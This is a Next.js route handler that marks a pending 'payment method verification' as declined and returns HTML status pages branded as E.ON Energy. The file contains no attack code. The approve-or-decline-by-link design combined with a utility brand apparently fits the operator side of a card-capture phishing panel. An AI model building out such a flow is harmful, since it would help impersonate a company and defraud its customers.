import { type NextRequest, NextResponse } from "next/server"
import { getVerificationStatus, updateVerificationStatus } from "../send-verification/route"

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams
    const verificationId = searchParams.get("id")

    if (!verificationId) {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Error - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>❌ Error</h1>
              <p>Invalid verification ID</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    const verification = getVerificationStatus(verificationId)

    if (!verification) {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Error - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>❌ Not Found</h1>
              <p>Verification request not found or expired</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    if (verification.status !== "pending") {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Already Processed - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #f59e0b; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>⚠️ Already Processed</h1>
              <p>This verification has already been ${verification.status}</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    // Update status to declined
    updateVerificationStatus(verificationId, "declined")

    return new NextResponse(
      `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Declined - E.ON Verification</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
            .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
            .icon { font-size: 4rem; margin-bottom: 1rem; }
            h1 { color: #ef4444; margin: 0 0 1rem 0; font-size: 2rem; }
            p { color: #4a5568; margin: 0; font-size: 1.1rem; line-height: 1.6; }
            .footer { margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #e5e7eb; color: #9ca3af; font-size: 0.9rem; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="icon">❌</div>
            <h1>Payment Declined</h1>
            <p>The payment method verification has been declined.</p>
            <p style="margin-top: 1rem;">The user will be notified and can try again.</p>
            <div class="footer">E.ON Energy - Secure Payment Processing</div>
          </div>
        </body>
      </html>
    `,
      { headers: { "Content-Type": "text/html" } },
    )
  } catch (error) {
    console.error("[v0] Decline error:", error)
    return new NextResponse(
      `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Error - E.ON Verification</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
            .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
            h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
            p { color: #4a5568; margin: 0; font-size: 1.1rem; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>❌ Error</h1>
            <p>An error occurred while processing the decline</p>
          </div>
        </body>
      </html>
    `,
      { headers: { "Content-Type": "text/html" }, status: 500 },
    )
  }
}
